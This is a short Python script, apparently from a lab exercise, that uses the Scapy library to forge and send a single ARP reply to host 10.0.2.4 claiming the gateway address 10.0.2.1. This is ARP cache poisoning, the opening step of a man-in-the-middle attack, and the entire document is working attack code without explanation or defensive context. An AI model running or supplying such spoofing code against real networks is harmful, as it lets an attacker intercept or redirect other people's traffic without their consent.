from scapy.all import srp, send
from scapy.layers.l2 import ARP, Ether

packet = ARP(op=2, pdst="10.0.2.4", hwdst="08:00:27:c0:c4:9d", psrc="10.0.2.1")
send(packet)